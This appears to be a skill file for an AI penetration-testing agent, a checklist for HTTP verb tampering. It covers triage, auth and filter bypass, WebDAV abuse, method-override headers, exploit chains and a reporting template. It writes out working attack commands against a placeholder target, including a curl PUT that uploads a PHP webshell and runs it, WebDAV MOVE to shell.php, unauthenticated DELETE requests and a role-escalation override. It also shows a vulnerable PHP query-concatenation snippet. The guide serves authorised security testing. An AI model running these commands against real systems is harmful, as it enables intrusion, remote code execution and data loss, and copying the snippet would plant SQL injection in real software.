---
name: verb-tampering
description: HTTP Verb Tampering — authentication bypass, security filter bypass, and unauthorized access via alternate HTTP methods (HEAD, PUT, DELETE, PATCH, OPTIONS, TRACE, CONNECT) and method override headers/parameters. Use when HauntMode flags verb tampering as APPLIES/MAYBE, when an endpoint returns 401/403 on GET/POST but may not check all methods, or when testing WebDAV-enabled servers.
---

# HTTP Verb Tampering

This is a short, complete skill. Verb tampering is quick to test — work through the full checklist before concluding the endpoint is not vulnerable. Read all sections before testing.

---

## 1. Triggers — when this skill applies

- Any endpoint returning 401 or 403 — the auth check may only cover GET/POST
- State-changing POST endpoints — test if GET is also accepted (both security filter bypass and SameSite CSRF bypass)
- Endpoints where auth is enforced via `<Limit GET POST>` in Apache config or similar server-side config (config protects named methods, others bypass)
- Filter-protected parameters — a sanitization filter applied only to `$_GET` or `$_POST` but the query uses `$_REQUEST` (picks up from any method)
- WebDAV-enabled servers (`PROPFIND`, `MKCOL`, `MOVE`, `COPY` may be available)
- APIs where method semantics matter (PUT vs POST vs PATCH on the same path)
- TRACE method presence → Cross-Site Tracing (XST) if `HttpOnly` cookies are present in the browser

---

---

## 3. 30-second triage

1. Find a protected endpoint (returns 401/403, or requires login, or applies a security filter).
2. Send an OPTIONS request to it:
   ```
   curl -i -X OPTIONS https://TARGET.com/protected-endpoint
   ```
3. Note the `Allow:` header — it lists accepted methods. Test all listed methods plus any not listed.
4. Try at minimum: `HEAD`, `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `TRACE`.
5. If any alternate method returns 200/302/other success → verb tampering confirmed.

---

## 4. Detection

### 4.1 Check accepted methods

```bash
curl -i -X OPTIONS https://TARGET.com/admin/
```

Look for: `Allow: GET, POST, HEAD, PUT, DELETE` in the response. But don't rely solely on this — test methods not listed too.

### 4.2 Auth bypass via HEAD

Apache `<Limit GET POST>` leaves HEAD unprotected. HEAD makes a GET request but returns only headers — no body — which is often sufficient to confirm auth bypass:

```bash
curl -i -X HEAD https://TARGET.com/admin/panel
```

If you get a `200 OK` (with no body) instead of `401` → auth bypass confirmed. Then try `GET` — if HEAD works, GET likely does too with some server configurations.

### 4.3 Security filter bypass

If a POST endpoint sanitizes `$_POST` but uses `$_REQUEST` for the actual query, bypassing via GET delivers the payload through a codepath that skips the filter:

1. Send the payload in a GET request with the same parameter name that was being sanitized in POST.
2. Example: POST `/search` filters `q` parameter, but change to GET `/search?q=PAYLOAD` to skip the filter.

### 4.4 GET-to-POST state change

If a POST endpoint performs a state-changing action:
- Try sending the same request as GET (move body params to query string)
- Also useful for CSRF (SameSite=Lax allows GET cross-site)

In Burp: right-click request → Change request method. Burp will automatically reformat the request.

### 4.5 Try all verbs on protected paths

For each interesting endpoint, send:
- `GET`, `POST`, `HEAD`, `PUT`, `DELETE`, `PATCH`, `OPTIONS`, `TRACE`, `CONNECT`

```bash
for method in GET POST HEAD PUT DELETE PATCH OPTIONS TRACE CONNECT; do
    echo -n "$method: "
    curl -s -o /dev/null -w "%{http_code}" -X $method https://TARGET.com/protected/
    echo
done
```

---

## 5. Exploitation

### 5.1 Auth bypass

If `HEAD` or another verb bypasses auth on `/admin`:
- `GET` or `POST` with that verb may return the full admin page
- Try reading sensitive files: `/admin/config`, `/admin/users`, `/backup/db.sql`
- If PUT is available without auth → file write: upload a webshell

### 5.2 PUT to write files (WebDAV or misconfigured server)

```bash
# Upload a PHP webshell
curl -X PUT https://TARGET.com/uploads/shell.php \
  --data '<?php system($_GET["cmd"]); ?>'

# Verify it executes
curl "https://TARGET.com/uploads/shell.php?cmd=id"
```

### 5.3 DELETE to remove resources

```bash
curl -X DELETE https://TARGET.com/api/users/1
curl -X DELETE https://TARGET.com/posts/42
```

May succeed without proper auth if only GET/POST are checked.

### 5.4 WebDAV methods

If the server supports WebDAV (check `DAV:` header or `PROPFIND` returning XML):

```bash
# Enumerate directory
curl -X PROPFIND https://TARGET.com/ -H "Depth: 1"

# Create a directory
curl -X MKCOL https://TARGET.com/uploads/pwned/

# Move/rename a file
curl -X MOVE https://TARGET.com/file.txt \
  -H "Destination: https://TARGET.com/shell.php"

# Copy a file
curl -X COPY https://TARGET.com/file.php \
  -H "Destination: https://TARGET.com/shell_copy.php"
```

### 5.5 TRACE — Cross-Site Tracing (XST)

TRACE echoes the full request including headers back to the client. When used with XSS:
- Inject JS that sends a TRACE request with the victim's cookies in the `Custom-Header`
- The TRACE response body includes all headers sent, potentially including `HttpOnly` cookies in older configurations

Check if TRACE is enabled:
```bash
curl -i -X TRACE https://TARGET.com/
```

If the response body echoes the request back → TRACE is enabled. Note for report — combined with XSS it's a theoretical HttpOnly cookie bypass (mostly patched in modern browsers but worth noting).

---

## 6. Method override bypass

Some apps (especially behind proxies, load balancers, or frameworks that block non-standard methods) support method override via header or parameter. Use this to smuggle a "real" DELETE/PUT through a proxy that only allows GET/POST:

### Via X-HTTP-Method-Override header

```
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

```
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: PUT
Content-Type: application/json

{"role": "admin"}
```

Other override headers to try:
- `X-Method-Override: DELETE`
- `X-HTTP-Method: DELETE`
- `_method: DELETE` (in query string or body for Rails/Laravel/Symfony apps)

### Via _method parameter (form and query string)

```
POST /api/resource HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=DELETE&id=1
```

```
GET /api/resource?_method=DELETE&id=1
```

### Why this matters for security

If the app processes `X-HTTP-Method-Override` or `_method`, an attacker can:
- Execute DELETE/PUT/PATCH via a GET/POST form (CSRF-able)
- Bypass WAF rules that block PUT/DELETE
- Access admin-only verb operations via a regular POST

---

## 7. Auth enforcement gap patterns

Two common misconfiguration patterns:

**Pattern 1 — Server config protects named verbs only:**
```xml
<!-- Apache: protects GET and POST, leaves HEAD/PUT/etc. open -->
<Limit GET POST>
    Require valid-user
</Limit>

<!-- Fix would be LimitExcept, which protects all except named -->
<LimitExcept GET POST>
    Deny from all
</LimitExcept>
```

When you get a 401 on GET → try HEAD, PUT, DELETE, PATCH. Any that return 200 bypass the auth.

**Pattern 2 — Application filter checks one method, query uses another:**
```php
// Vulnerable pattern: filter checks GET, but query reads REQUEST (picks up POST/COOKIE too)
if(preg_match($pattern, $_GET["code"])) {
    $query = "SELECT * FROM table WHERE code='" . $_REQUEST["code"] . "'";
}
```

Send the SQLi/CMDi payload via POST instead of GET — the filter never sees it.

---

## 8. False-positive checks

- A `200 OK` on HEAD means the resource exists with proper headers, but verify that GET also succeeds — a HEAD response of 200 does not automatically mean GET is unprotected.
- Verify that the response to the alternate verb actually returned sensitive/protected content, not just a status code 200 with an empty or generic body.
- Some apps return 200 for all unrecognized methods (catch-all handler) — confirm the response body actually reveals protected data or that the state change occurred.
- TRACE on modern browsers does not expose HttpOnly cookies from JavaScript even if TRACE is enabled — context matters for the XST finding.
- `OPTIONS` returning a broad `Allow:` header does not alone prove bypass — test each method.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Verb tamper → auth bypass on admin panel → admin access | `idor`, `auth-bypass` | Unauthenticated admin |
| Verb tamper → GET-based state change → CSRF via GET link | `csrf` | Attacker-controlled state change |
| Verb tamper on filter → security filter skip → SQLi/CMDi | `sqli`, `cmdi` | Exploits filter gap |
| PUT available without auth → file write → webshell | `file-upload`, `cmdi` | RCE |
| WebDAV MOVE → rename .txt to .php → code execution | `file-upload` | Code execution |
| TRACE enabled + XSS present → XST HttpOnly cookie theft | `xss` | Cookie theft escalation |
| Method override header accepted → CSRF-able DELETE | `csrf` | Resource deletion CSRF |

---

## 10. Reporting template

```
POTENTIAL FINDING: HTTP Verb Tampering
Target: <full URL>
Protected via: <401/403 on GET+POST | security filter on GET | WebDAV>
Bypass method: <HEAD | PUT | DELETE | PATCH | X-HTTP-Method-Override: X | _method=X>
Working request:
    <exact HTTP method + URL + relevant headers>
Response evidence:
    <HTTP status + excerpt showing protected content or successful state change>
Impact:
    <e.g. "Unauthenticated access to /admin/panel via HEAD request bypassing Apache Limit directive">
    <e.g. "SQLi filter only applied to GET requests; POST bypass allows SQL injection on same parameter">
    <e.g. "PUT method accepted on /uploads/ without auth, enabling arbitrary file write">
Chain potential: <e.g. "PUT → webshell → RCE">
Next step: <confirm PUT/webshell execution, attempt file write to web-accessible path>
```

---

## 11. Recon tracker vector strings

Only log if user explicitly instructs (CLAUDE.md hard rule):

- `verb-tamper:auth-bypass:<method>:<endpoint>` — named method bypasses auth
- `verb-tamper:filter-bypass:<method>:<endpoint>` — alternate method skips security filter
- `verb-tamper:put-write:<endpoint>` — PUT accepted, file write possible
- `verb-tamper:webdav:<method>:<endpoint>` — WebDAV method available
- `verb-tamper:override:<header>:<endpoint>` — method override header accepted
- `verb-tamper:no:<endpoint>` — tested, all methods properly restricted

---

## 12. What NOT to do

- Do not use PUT to overwrite existing legitimate files on the server — use a unique filename (e.g. `verb_tamper_test.php`) and clean up immediately after confirming the vulnerability
- Do not use DELETE to remove application data or files — only confirm the method is accepted, don't actually delete anything
- Do not run WebDAV property enumeration (`PROPFIND`) at high speed — it can be noisy and hit rate limits
- Do not report TRACE as standalone critical without demonstrating a practical exploit path (modern browsers prevent XST from JavaScript context in most configurations)
- Do not auto-log to the recon tracker without explicit user instruction
